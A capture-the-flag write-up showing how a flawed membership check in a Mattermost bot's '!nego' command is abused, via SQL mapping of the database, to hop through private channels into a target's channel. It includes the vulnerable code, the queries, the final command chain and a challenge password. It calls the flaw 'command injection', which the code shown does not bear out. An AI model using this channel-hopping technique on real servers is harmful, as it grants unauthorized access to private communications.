# Task 6 - (Mattermost Channel Access)

> This high visibility investigation has garnered a lot of agency attention. Due to your success, your team has designated you as the lead for the tasks ahead. Partnering with CNO and CYBERCOM mission elements, you work with operations to collect the persistent data associated with the identified Mattermost instance. Our analysts inform us that it was obtained through a one-time opportunity and we must move quickly as this may hold the key to tracking down our adversary! We have managed to create an account but it only granted us access to one channel. The adversary doesn't appear to be in that channel.

> We will have to figure out how to get into the same channel as the adversary. If we can gain access to their communications, we may uncover further opportunity.

> You are tasked with gaining access to the same channel as the target. The only interface that you have is the chat interface in Mattermost!

---

## Downloads

- **Mattermost instance:** `volumes.tar.gz`
- **User login:** `user.txt`

---

## Prompt

- **Submit a series of commands, one per line, given to the Mattermost server which will allow you to gain access to a channel with the adversary.**

---

## Writeup

This task was relatively straightforward and took approximately 30 minutes to complete. It involved analyzing the Mattermost bot plugins to discover a command injection vulnerability.

### Initial Analysis

I began by extracting the provided archive and examining the contents:
```bash
~/Downloads ❯ tar -xvf volumes.tar.gz

~/Downloads ❯ cat user.txt
cynicaltuna4:ViPgVWPQheHshaPs
```

This gave me the credentials to access the Mattermost instance. Next, I explored the extracted directory structure:
```bash
~/Downloads ❯ cd volumes
~/Downloads/volumes ❯ ls
bot  db

~/Downloads/volumes ❯ cd bot
~/Downloads/volumes/bot ❯ ls
bot.py  malware_database.py  mmpy_bot_monkeypatch.py  plugin_admin.py  plugin_managechannel.py  plugin_onboarding.py  plugin_sales.py
```

The `bot` directory contained several Python scripts implementing various Mattermost bot plugins. After reviewing each plugin, I discovered the `!nego` command in `plugin_sales.py`.

### Vulnerability Discovery

The `!nego` command is designed to create private negotiation channels between users. Examining the code revealed a critical vulnerability in how it handles user inputs and channel membership verification.

```python
@listen_to('^!nego (.*)$', no_direct=True,human_description="!nego channel seller moderator1 moderator2\n\tCreate a negotiation channel to close a deal!")
    def handle_nego(self : Plugin, message: Message, *args):
        logger.debug(f"handle_nego called with message: {message.text}")
        args = message.text.strip().split()
        if len(args) != 5:
            self.driver.reply_to(message, "Usage: !nego channel seller moderator1 moderator2")
            logger.warning("handle_nego: Incorrect number of arguments")
            return
        user1 = message.sender_name
        _, channel_name, user2, user3, user4 = args[:6]
        if not user4.startswith('mod_'):
            self.driver.reply_to(message, f"You must have a mod")
            return
        display_name = channel_name
        team_name = self.driver.options.get('team', 'malwarecentral')
        print(f"[DEBUG] Looking up team: {team_name}")
        # Get team info
        team = self.driver.teams.get_team_by_name(team_name)
        logger.debug(f"Team API response: {team}")
        team_id = team.get('id') if isinstance(team, dict) else team.json().get('id')
        print(f"[DEBUG] team_id: {team_id}")
        # Create channel
        channel_options = {
            "team_id": team_id,
            "name": channel_name,
            "display_name": display_name,
            "type": "P"
        }
        logger.debug(f"Creating channel with options: {channel_options}")
        try:
            channel = self.driver.channels.create_channel(channel_options)
            print(f"[DEBUG] Channel API response: {channel}")
        #hide weird exception when we have an archived channel with the same name, we'll just unarchive it
        except Exception as e:
            print(f"[DEBUG] Exception while creating channel: {e}")
            # Try to unarchive the channel if it exists
            try:
                archived_channel = self.driver.channels.get_channel_by_name(channel_name, team_id)
                if archived_channel and archived_channel.get('delete_at') > 0:
                    logger.info(f"Unarchiving existing channel: {archived_channel}")
                    self.driver.channels.unarchive_channel(archived_channel.get('id'))
                    channel = archived_channel
            except Exception as e:
                self.driver.reply_to(message, f"Failed to create or unarchive channel: {e}")
        #we either created a new channel or unarchived an existing one
        print(f"[DEBUG] getting channel: {channel_name} in team {team_id}")
        channel = self.driver.channels.get_channel_by_name(team_id, channel_name)
        channel_id = channel.get('id') if isinstance(channel, dict) else channel.json().get('id')
        print(f"[DEBUG] channel_id: {channel_id}")
        # Get user ids
        user_ids = []
        for uname in [user1, user2, user3, user4]:
            logger.debug(f"Looking up user: {uname}")
            user = self.driver.users.get_user_by_username(uname)
            logger.debug(f"User API response: {user}")
            uid = user.get('id') if isinstance(user, dict) else user.json().get('id')
            logger.debug(f"user_id for {uname}: {uid}")
            if not uid:
                self.driver.reply_to(message, f"User not found: {uname}")
                logger.warning(f"handle_nego: User not found: {uname}")
                return
            user_ids.append(uid)
        if len(set(user_ids)) != 4:
            logger.warning(f"incorrect number of users to run command")
            self.driver.reply_to(message, f"incorrect number of users to run command")
            return
        print(f"[DEBUG] All user_ids: {user_ids}")

        # Check if channel already has members
        existing_members = self.driver.channels.get_channel_members(channel_id)
        existing_member_user_ids = [member.get('user_id') for member in existing_members]
        existing_user_ids = any(uid in user_ids for uid in existing_member_user_ids)
        if existing_user_ids:
            # If the channel already has members, we should not add them again
            # This is a safeguard against creating duplicate entries in an archived channel
            print(f"[DEBUG] Existing members in channel {channel_id}: {existing_member_user_ids}, this shouldn't happen! archived channels should be empty")
            return
        # make sure not adding randos
        current_members_ids = [m['user_id'] for m in self.driver.channels.get_channel_members(message.channel_id)]
        if not (user_ids[0] in current_members_ids and user_ids[1] in current_members_ids and
                user_ids[2] in current_members_ids and user_ids[3] in current_members_ids):
            self.driver.reply_to(message, f"Could not find users")
            return

        # Add users to channel
        for uid in user_ids:
            logger.debug(f"Adding user {uid} to channel {channel_id}")
            self.driver.channels.add_channel_member(channel_id, {"user_id": uid})
        self.driver.reply_to(message, f"Created channel '{display_name}' and added users: {user1}, {user2}, {user3}")
        logger.info(f"Created channel '{display_name}' and added users: {user1}, {user2}, {user3}")
```

The vulnerability exists in the channel membership verification logic. While the function checks if users exist and attempts to verify they're in the current channel, it can be exploited to add yourself to any private channel by leveraging...

I also identified the PostgreSQL version being used:
```bash
~/Downloads/volumes/db/var/lib/postgresql/data ❯ cat PG_VERSION
13
```

### Exploitation Strategy

To exploit the `!nego` vulnerability, I needed to understand how the function works and what constraints it has. The key insight is that the `!nego` command:

1. Creates a new private channel (or unarchives an existing one)
2. Adds four users to that channel: the command invoker and three specified users
3. Critically, verifies that all four users are members of the **current channel** where the command is executed

The vulnerability lies in the fact that once added to a new channel, you can use `!nego` again from that channel to hop to another channel, as long as you can find overlapping user memberships. This allows for channel hopping: Public → Channel A → Channel B → ... → Target Channel.

### Database Analysis

I set up a local PostgreSQL instance to analyze the Mattermost database and plan my exploitation path:
```bash
┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker run -d \
  --name mattermost-db \
  -e POSTGRES_HOST_AUTH_METHOD=trust \
  postgres:13

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker stop mattermost-db

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker cp volumes/db/var/lib/postgresql/data/. mattermost-db:/var/lib/postgresql/data/

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker start mattermost-db

┌──(kali㉿kali)-[~/Desktop/NSA_Codebreaker/Task6]
└─$ sudo docker exec -it mattermost-db psql -U mmuser -d mattermost
```

First, I identified all users in the system and confirmed my starting position:
```sql
mattermost=# SELECT username, email, roles FROM users;
```

This revealed 20 users, including my account `cynicaltuna4` and several moderator accounts (prefixed with `mod_`).

Next, I verified which channel I currently had access to:
```sql
mattermost=# SELECT c.name, c.displayname, c.type 
FROM channels c
JOIN channelmembers cm ON c.id = cm.channelid
JOIN users u ON cm.userid = u.id
WHERE u.username = 'cynicaltuna4';
```

As expected, I only had access to the `public` channel. I then identified all members of this channel:
```sql
mattermost=# SELECT u.username 
FROM channels c
JOIN channelmembers cm ON c.id = cm.channelid
JOIN users u ON cm.userid = u.id
WHERE c.name = 'public'
ORDER BY u.username;
```

The public channel contained 9 users: `affectedorange68`, `awedbasmati13`, `cynicaltuna4`, `dreadfulantelope98`, `malbot`, `mod_stressedcheese82`, `pacifiedsnail22`, `troubledllama32`, and `unhappyeland26`.

### Finding the Hop Path

To reach the adversary's channel, I needed to find a chain of private channels where each successive channel shared at least 4 users with the previous one (including myself and a moderator). I developed SQL queries to identify viable hop targets.

**Step 1: Finding the first hop from Public**
```sql
SELECT c.name, c.displayname,
  9 - (SELECT COUNT(*) 
   FROM channelmembers cm 
   WHERE cm.channelid = c.id 
   AND cm.userid IN (
     SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='public')
   )) as missing_public_members,
  (SELECT string_agg(u.username, ', ')
   FROM users u
   WHERE u.id IN (
     SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='public')
   )
   AND u.id NOT IN (
     SELECT userid FROM channelmembers WHERE channelid = c.id
   )) as available_users
FROM channels c
WHERE c.type = 'P'
AND 9 - (SELECT COUNT(*) 
     FROM channelmembers cm 
     WHERE cm.channelid = c.id 
     AND cm.userid IN (
       SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='public')
     )) >= 4
ORDER BY missing_public_members DESC, c.name;
```

This query revealed `channel17298` as a viable first hop, requiring 4 users from public: `mod_stressedcheese82`, `affectedorange68`, `pacifiedsnail22`, and `cynicaltuna4`.

**Step 2: Finding subsequent hops**

I repeated this process, simulating the channel membership after each `!nego` command. For each hop, I used a CTE (Common Table Expression) to model what the user pool would look like after gaining access to the new channel:
```sql
WITH channel17298_after_nego AS (
  SELECT userid FROM channelmembers WHERE channelid = (SELECT id FROM channels WHERE name='channel17298')
  UNION
  SELECT id FROM users WHERE username IN ('cynicaltuna4', 'affectedorange68', 'pacifiedsnail22', 'mod_stressedcheese82')
)
SELECT c.name, c.displayname, ...
```

This analysis revealed the complete exploitation path:
- **Public** → **channel17298** (using: `cynicaltuna4`, `affectedorange68`, `pacifiedsnail22`, `mod_stressedcheese82`)
- **channel17298** → **channel38107** (using: `cynicaltuna4`, `pacifiedsnail22`, `mildlapwing47`, `mod_innocentrelish97`)
- **channel38107** → **channel17132** (using: `cynicaltuna4`, `mildlapwing47`, `sorebuzzard67`, `mod_sugarythrushe15`)
- **channel17132** → **channel26325** (using: `cynicaltuna4`, `sorebuzzard67`, `meremussel4`, `mod_sugarycrane58`)

### Submission

With the exploitation path identified through database analysis, I submitted the following series of commands to the NSA Codebreaker platform:
```
!nego channel17298 affectedorange68 pacifiedsnail22 mod_stressedcheese82 
!nego channel38107 pacifiedsnail22 mildlapwing47 mod_innocentrelish97 
!nego channel17132 mildlapwing47 sorebuzzard67 mod_sugarythrushe15 
!nego channel26325 meremussel4 sorebuzzard67 mod_sugarycrane58
```

It's important to note that the order matters, as looking back at the !nego command, it requires the mod user to be last.

<p align="center">
<img src="images/badge6.png" alt="Badge" width="300"/>
</p>

**Success!** By exploiting the `!nego` command's membership verification logic and carefully mapping out user overlaps between channels, I successfully gained access to the adversary's private channel.
